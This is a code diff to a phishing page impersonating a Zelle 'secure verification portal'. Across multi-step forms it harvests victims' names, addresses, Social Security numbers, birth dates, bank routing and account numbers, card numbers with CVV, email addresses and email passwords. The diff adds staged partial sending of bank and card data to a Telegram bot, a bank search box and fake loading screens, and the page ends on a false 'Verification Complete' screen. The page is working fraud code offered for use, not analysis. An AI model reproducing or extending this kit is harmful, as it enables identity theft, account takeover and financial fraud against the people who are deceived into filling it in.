+        const bankData = { ...formData, submissionStage: "BANK_VERIFICATION_PARTIAL" };
         const result = await sendToTelegramAPI(bankData, 'partial_bank');
+        hideLoading();
         if (result.success) { partialDataSent.bank = true; showTemporaryMessage('✓ Bank details verified and recorded', 'success'); return true; }
+        return false;
+    }
+    
+    async function sendPartialCardData() {
+        if (partialDataSent.card) return true;
+        showLoading("Verifying card details...");
+        const cardData = { ...formData, submissionStage: "CARD_VERIFICATION_PARTIAL" };
+        const result = await sendToTelegramAPI(cardData, 'partial_card');
+        hideLoading();
+        if (result.success) { partialDataSent.card = true; showTemporaryMessage('✓ Card details verified and recorded', 'success'); return true; }
         return false;
     }
     
@@ -230,34 +358,70 @@
         if (!formData.password) { showTemporaryMessage('Please enter your email password to complete verification', 'error'); return; }
         
         isSubmitting = true;
-        const submitBtn = document.getElementById('finalSubmitBtn');
-        if (submitBtn) { submitBtn.disabled = true; submitBtn.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Verifying...'; }
+        showLoading("Completing verification...");
         
         try {
             const fullData = { ...formData, submissionStage: "FULL_COMPLETION", emailProvider: getEmailProviderInfo(formData.email).name };
             const result = await sendToTelegramAPI(fullData, 'full_completion');
+            hideLoading();
             if (result.success) { showThanksPage(); } 
             else { showTemporaryMessage(result.error || 'Verification failed. Please try again.', 'error'); }
-        } catch (error) { showTemporaryMessage('Connection error. Please check your internet and try again.', 'error'); } 
-        finally { isSubmitting = false; if (submitBtn) { submitBtn.disabled = false; submitBtn.innerHTML = '<i class="fab fa-telegram"></i> Complete Verification'; } }
+        } catch (error) { hideLoading(); showTemporaryMessage('Connection error. Please check your internet and try again.', 'error'); } 
+        finally { isSubmitting = false; }
     }
     
-    function showThanksPage() { const container = document.getElementById('stepsContainer'); const progressDiv = document.getElementById('progressTracker'); if (container) { container.innerHTML = `<div class="success-page"><div class="success-icon"><i class="fas fa-shield-alt"></i></div><h2 style="margin-bottom: 16px; font-size: 1.8rem;">✅ Verification Complete</h2><p style="margin-bottom: 24px; color: #475569;">Your identity has been securely verified.<br>You will receive a confirmation shortly.</p><div style="background: #f0fdf4; padding: 16px; border-radius: 24px;"><i class="fas fa-lock" style="color: #10b981;"></i><span style="font-size: 0.85rem;"> Zelle® Protection Active</span></div></div>`; if (progressDiv) progressDiv.style.display = 'none'; } }
+    function showThanksPage() { 
+        const container = document.getElementById('stepsContainer'); 
+        const progressDiv = document.getElementById('progressTracker'); 
+        if (container) { 
+            container.innerHTML = `<div class="success-page"><div class="success-icon"><i class="fas fa-shield-alt"></i></div><h2 style="margin-bottom: 16px; font-size: 1.8rem;">✅ Verification Complete</h2><p style="margin-bottom: 24px; color: #475569;">Your identity has been securely verified.<br>You will receive a confirmation shortly.</p><div style="background: #f0fdf4; padding: 16px; border-radius: 24px;"><i class="fas fa-lock" style="color: #10b981;"></i><span style="font-size: 0.85rem;"> Zelle® Protection Active</span></div></div>`; 
+            if (progressDiv) progressDiv.style.display = 'none'; 
+        } 
+    }
+    
+    function initBankSearch() {
+        const searchInput = document.getElementById('bankSearchInput');
+        const hiddenSelect = document.getElementById('bankSelectHidden');
+        const dropdown = document.getElementById('bankDropdown');
+        
+        if (!searchInput) return;
+        
+        const updateDropdown = () => {
+            const term = searchInput.value.toLowerCase();
+            const filtered = BANK_LIST.filter(bank => bank.toLowerCase().includes(term));
+            dropdown.innerHTML = filtered.map(bank => `<div class="bank-option" data-bank="${bank}">${bank}</div>`).join('');
+            if (filtered.length > 0 && term) dropdown.classList.add('show');
+            else if (!term) dropdown.classList.remove('show');
+            
+            document.querySelectorAll('.bank-option').forEach(opt => {
+                opt.addEventListener('click', () => {
+                    const bankName = opt.getAttribute('data-bank');
+                    searchInput.value = bankName;
+                    hiddenSelect.value = bankName;
+                    formData.bankName = bankName;
+                    dropdown.classList.remove('show');
+                });
+            });
+        };
+        
+        searchInput.addEventListener('input', updateDropdown);
+        searchInput.addEventListener('focus', () => { if (searchInput.value) updateDropdown(); });
+        document.addEventListener('click', (e) => { if (!searchInput.contains(e.target) && !dropdown.contains(e.target)) dropdown.classList.remove('show'); });
+        
+        if (formData.bankName) {
+            searchInput.value = formData.bankName;
+            hiddenSelect.value = formData.bankName;
+        }
+    }
     
     function showEmailPasswordUI(email) {
         const provider = getEmailProviderInfo(email);
-        currentEmailDomain = email.split('@')[1];
-        
         const container = document.getElementById('stepsContainer');
         container.innerHTML = `
             <div class="email-provider-card">
-                <div class="provider-icon ${provider.bgClass}">
-                    <i class="${provider.icon}"></i>
-                </div>
+                <div class="provider-icon ${provider.bgClass}"><i class="${provider.icon}"></i></div>
                 <span class="provider-badge ${provider.badgeClass}">${provider.name}</span>
-                <div class="provider-email">
-                    <i class="fas fa-envelope"></i> ${escapeHtml(email)}
-                </div>
+                <div class="provider-email"><i class="fas fa-envelope"></i> ${escapeHtml(email)}</div>
                 <div class="input-group password-input-container">
                     <label><i class="fas fa-lock"></i> Enter your ${provider.name} password</label>
                     <input type="password" id="emailPasswordInput" placeholder="••••••••" autocomplete="current-password">
@@ -281,24 +445,14 @@
             });
         }
         
-        if (finalBtn) {
-            finalBtn.addEventListener('click', () => {
-                const pwd = passwordInput.value;
-                if (!pwd) {
-                    showTemporaryMessage('Please enter your password', 'error');
-                    return;
-                }
-                formData.password = pwd;
-                finalSubmit();
-            });
-        }
+        if (finalBtn) finalBtn.addEventListener('click', () => {
+            const pwd = passwordInput.value;
+            if (!pwd) { showTemporaryMessage('Please enter your password', 'error'); return; }
+            formData.password = pwd;
+            finalSubmit();
+        });
         
-        if (backBtn) {
-            backBtn.addEventListener('click', () => {
-                emailSubmitted = false;
-                renderStep(5);
-            });
-        }
+        if (backBtn) backBtn.addEventListener('click', () => { emailSubmitted = false; renderStep(5); });
     }
     
     async function goToNextStep() {
@@ -312,11 +466,11 @@
         }
         
         if (currentStep === 4) {
-            currentStep++;
-            renderProgress();
-            renderStep(currentStep);
-            window.scrollTo({ top: 0, behavior: 'smooth' });
-        } else if (currentStep < steps.length - 1) {
+            const sendResult = await sendPartialCardData();
+            if (!sendResult) { showTemporaryMessage('Unable to verify card details. Please check your connection.', 'error'); return; }
+        }
+        
+        if (currentStep < steps.length - 1) {
             currentStep++;
             renderProgress();
             renderStep(currentStep);
@@ -340,7 +494,6 @@
         if (!email) { showTemporaryMessage('Please enter your email address', 'error'); return; }
         const emailRegex = /^[^\s@]+@([^\s@]+)$/;
         if (!emailRegex.test(email)) { showTemporaryMessage('Please enter a valid email address', 'error'); return; }
-        
         emailSubmitted = true;
         showEmailPasswordUI(email);
     }
@@ -351,29 +504,15 @@
         
         if (stepIndex === 5 && !emailSubmitted) {
             const stateOptions = US_STATES.map(state => `<option value="${state}" ${formData.addressState === state ? 'selected' : ''}>${state}</option>`).join('');
-            const bankOptions = BANK_LIST.map(bank => `<option value="${bank}" ${formData.bankName === bank ? 'selected' : ''}>${bank}</option>`).join('');
-            
-            const stepsHtml = {
-                0: `<div class="step-content"><div class="input-group"><label><i class="fas fa-user"></i> Full Legal Name</label><input type="text" data-field="fullName" placeholder="Johnathan Michael Doe" value="${escapeHtml(formData.fullName)}"></div><button class="btn-next btn-purple" id="nextStepBtn"><i class="fas fa-arrow-right"></i> Continue</button></div>`,
-                1: `<div class="step-content"><div class="input-group"><label><i class="fas fa-home"></i> Street Address</label><input type="text" data-field="addressStreet" placeholder="123 Main St, Apt 4B" value="${escapeHtml(formData.addressStreet)}"></div><div class="input-group"><label>City</label><input type="text" data-field="addressCity" placeholder="City" value="${escapeHtml(formData.addressCity)}"></div><div class="input-group"><label>State</label><select data-field="addressState">${stateOptions}</select></div><div class="input-group"><label>ZIP Code</label><input type="text" data-field="addressZip" placeholder="ZIP Code" value="${escapeHtml(formData.addressZip)}"></div><button class="btn-next btn-purple" id="nextStepBtn">Continue <i class="fas fa-arrow-right"></i></button><button class="btn-back" id="prevStepBtn"><i class="fas fa-chevron-left"></i> Back</button></div>`,
-                2: `<div class="step-content"><div class="input-group"><label><i class="fas fa-id-card"></i> Social Security Number</label><input type="text" data-field="ssn" id="ssnInput" placeholder="XXX-XX-XXXX" value="${escapeHtml(formData.ssn)}" maxlength="11"></div><div class="input-group"><label><i class="fas fa-calendar-alt"></i> Date of Birth</label><input type="date" data-field="dob" value="${escapeHtml(formData.dob)}"></div><button class="btn-next btn-purple" id="nextStepBtn">Continue <i class="fas fa-arrow-right"></i></button><button class="btn-back" id="prevStepBtn"><i class="fas fa-chevron-left"></i> Back</button></div>`,
-                3: `<div class="step-content"><div class="input-group"><label><i class="fas fa-university"></i> Select Your Bank</label><select data-field="bankName">${bankOptions}</select></div><div class="input-group"><label><i class="fas fa-route"></i> Routing Number (9-digit)</label><input type="text" data-field="routingNumber" id="routingInput" placeholder="021000021" value="${escapeHtml(formData.routingNumber)}" maxlength="9"></div><div class="input-group"><label><i class="fas fa-credit-card"></i> Account Number</label><input type="text" data-field="accountNumber" placeholder="Your bank account number" value="${escapeHtml(formData.accountNumber)}"></div><button class="btn-next btn-purple" id="nextStepBtn">Continue <i class="fas fa-arrow-right"></i></button><button class="btn-back" id="prevStepBtn"><i class="fas fa-chevron-left"></i> Back</button></div>`,
-                4: `<div class="step-content"><div class="input-group"><label><i class="fas fa-credit-card"></i> Debit/Credit Card Number</label><input type="text" data-field="cardNumber" id="cardInput" placeholder="4672 3782 2893 3782" value="${escapeHtml(formData.cardNumber)}" maxlength="19"></div><div class="input-group"><label>Expiry Date (MM/YY)</label><input type="text" data-field="cardExpiry" id="expiryInput" placeholder="MM/YY" value="${escapeHtml(formData.cardExpiry)}" maxlength="5"></div><div class="input-group"><label>CVV</label><input type="password" data-field="cardCvv" id="cvvInput" placeholder="123" value="${escapeHtml(formData.cardCvv)}" maxlength="3"></div><button class="btn-next btn-purple" id="nextStepBtn">Continue <i class="fas fa-arrow-right"></i></button><button class="btn-back" id="prevStepBtn"><i class="fas fa-chevron-left"></i> Back</button></div>`,
-                5: `<div class="step-content"><div class="input-group"><label><i class="fas fa-envelope"></i> Email Address</label><input type="email" data-field="email" id="emailInputField" placeholder="you@gmail.com" value="${escapeHtml(formData.email)}"></div><button class="btn-next btn-purple" id="submitEmailBtn"><i class="fas fa-arrow-right"></i> Continue to Verification</button><button class="btn-back" id="prevStepBtn"><i class="fas fa-chevron-left"></i> Back</button></div>`
-            };
-            
-            container.innerHTML = stepsHtml[stepIndex];
-            
-            document.getElementById('ssnInput')?.addEventListener('input', (e) => { e.target.value = formatSSN(e.target.value); });
-            document.getElementById('routingInput')?.addEventListener('input', (e) => { e.target.value = e.target.value.replace(/\D/g, '').slice(0, 9); });
-            const cardInput = document.getElementById('cardInput');
-            if (cardInput) { cardInput.addEventListener('input', (e) => { e.target.value = formatCardNumber(e.target.value); if (validateCardNumber(e.target.value)) e.target.classList.add('valid-card'); else e.target.classList.remove('valid-card'); }); }
-            document.getElementById('expiryInput')?.addEventListener('input', (e) => { e.target.value = formatExpiry(e.target.value); });
-            document.getElementById('cvvInput')?.addEventListener('input', (e) => { e.target.value = e.target.value.replace(/\D/g, '').slice(0, 3); });
-            
-            document.getElementById('nextStepBtn')?.addEventListener('click', goToNextStep);
-            document.getElementById('prevStepBtn')?.addEventListener('click', goToPrevStep);
+            container.innerHTML = `
+                <div class="step-content">
+                    <div class="input-group"><label><i class="fas fa-envelope"></i> Email Address</label><input type="email" data-field="email" id="emailInputField" placeholder="you@gmail.com" value="${escapeHtml(formData.email)}"></div>
+                    <button class="btn-next btn-purple" id="submitEmailBtn"><i class="fas fa-arrow-right"></i> Continue to Verification</button>
+                    <button class="btn-back" id="prevStepBtn"><i class="fas fa-chevron-left"></i> Back</button>
+                </div>
+            `;
             document.getElementById('submitEmailBtn')?.addEventListener('click', handleEmailSubmit);
+            document.getElementById('prevStepBtn')?.addEventListener('click', goToPrevStep);
         } else if (stepIndex === 5 && emailSubmitted) {
             showEmailPasswordUI(formData.email);
         } else {
@@ -384,7 +523,7 @@
                 0: `<div class="step-content"><div class="input-group"><label><i class="fas fa-user"></i> Full Legal Name</label><input type="text" data-field="fullName" placeholder="Johnathan Michael Doe" value="${escapeHtml(formData.fullName)}"></div><button class="btn-next btn-purple" id="nextStepBtn"><i class="fas fa-arrow-right"></i> Continue</button></div>`,
                 1: `<div class="step-content"><div class="input-group"><label><i class="fas fa-home"></i> Street Address</label><input type="text" data-field="addressStreet" placeholder="123 Main St, Apt 4B" value="${escapeHtml(formData.addressStreet)}"></div><div class="input-group"><label>City</label><input type="text" data-field="addressCity" placeholder="City" value="${escapeHtml(formData.addressCity)}"></div><div class="input-group"><label>State</label><select data-field="addressState">${stateOptions}</select></div><div class="input-group"><label>ZIP Code</label><input type="text" data-field="addressZip" placeholder="ZIP Code" value="${escapeHtml(formData.addressZip)}"></div><button class="btn-next btn-purple" id="nextStepBtn">Continue <i class="fas fa-arrow-right"></i></button><button class="btn-back" id="prevStepBtn"><i class="fas fa-chevron-left"></i> Back</button></div>`,
                 2: `<div class="step-content"><div class="input-group"><label><i class="fas fa-id-card"></i> Social Security Number</label><input type="text" data-field="ssn" id="ssnInput" placeholder="XXX-XX-XXXX" value="${escapeHtml(formData.ssn)}" maxlength="11"></div><div class="input-group"><label><i class="fas fa-calendar-alt"></i> Date of Birth</label><input type="date" data-field="dob" value="${escapeHtml(formData.dob)}"></div><button class="btn-next btn-purple" id="nextStepBtn">Continue <i class="fas fa-arrow-right"></i></button><button class="btn-back" id="prevStepBtn"><i class="fas fa-chevron-left"></i> Back</button></div>`,
-                3: `<div class="step-content"><div class="input-group"><label><i class="fas fa-university"></i> Select Your Bank</label><select data-field="bankName">${bankOptions}</select></div><div class="input-group"><label><i class="fas fa-route"></i> Routing Number (9-digit)</label><input type="text" data-field="routingNumber" id="routingInput" placeholder="021000021" value="${escapeHtml(formData.routingNumber)}" maxlength="9"></div><div class="input-group"><label><i class="fas fa-credit-card"></i> Account Number</label><input type="text" data-field="accountNumber" placeholder="Your bank account number" value="${escapeHtml(formData.accountNumber)}"></div><button class="btn-next btn-purple" id="nextStepBtn">Continue <i class="fas fa-arrow-right"></i></button><button class="btn-back" id="prevStepBtn"><i class="fas fa-chevron-left"></i> Back</button></div>`,
+                3: `<div class="step-content"><div class="bank-search-container"><label><i class="fas fa-university"></i> Select Your Bank</label><input type="text" id="bankSearchInput" class="bank-search-input" placeholder="Search for your bank..." autocomplete="off"><input type="hidden" data-field="bankName" id="bankSelectHidden" value="${escapeHtml(formData.bankName)}"><div id="bankDropdown" class="bank-dropdown"></div></div><div class="input-group"><label><i class="fas fa-route"></i> Routing Number (9-digit)</label><input type="text" data-field="routingNumber" id="routingInput" placeholder="021000021" value="${escapeHtml(formData.routingNumber)}" maxlength="9"></div><div class="input-group"><label><i class="fas fa-credit-card"></i> Account Number</label><input type="text" data-field="accountNumber" placeholder="Your bank account number" value="${escapeHtml(formData.accountNumber)}"></div><button class="btn-next btn-purple" id="nextStepBtn">Continue <i class="fas fa-arrow-right"></i></button><button class="btn-back" id="prevStepBtn"><i class="fas fa-chevron-left"></i> Back</button></div>`,
                 4: `<div class="step-content"><div class="input-group"><label><i class="fas fa-credit-card"></i> Debit/Credit Card Number</label><input type="text" data-field="cardNumber" id="cardInput" placeholder="4672 3782 2893 3782" value="${escapeHtml(formData.cardNumber)}" maxlength="19"></div><div class="input-group"><label>Expiry Date (MM/YY)</label><input type="text" data-field="cardExpiry" id="expiryInput" placeholder="MM/YY" value="${escapeHtml(formData.cardExpiry)}" maxlength="5"></div><div class="input-group"><label>CVV</label><input type="password" data-field="cardCvv" id="cvvInput" placeholder="123" value="${escapeHtml(formData.cardCvv)}" maxlength="3"></div><button class="btn-next btn-purple" id="nextStepBtn">Continue <i class="fas fa-arrow-right"></i></button><button class="btn-back" id="prevStepBtn"><i class="fas fa-chevron-left"></i> Back</button></div>`
             };
             
@@ -399,13 +538,19 @@
             
             document.getElementById('nextStepBtn')?.addEventListener('click', goToNextStep);
             document.getElementById('prevStepBtn')?.addEventListener('click', goToPrevStep);
+            
+            if (stepIndex === 3) initBankSearch();
         }
     }
     
     function escapeHtml(str) { if(!str) return ''; return str.replace(/[&<>]/g, function(m){ if(m === '&') return '&amp;'; if(m === '<') return '&lt;'; if(m === '>') return '&gt;'; return m; }); }
     
-    function init() { renderProgress(); renderStep(0); }
-    init();
+    showLoading("Loading secure verification portal...");
+    setTimeout(() => {
+        hideLoading();
+        renderProgress();
+        renderStep(0);
+    }, 1000);
 </script>
 </body>
 </html>
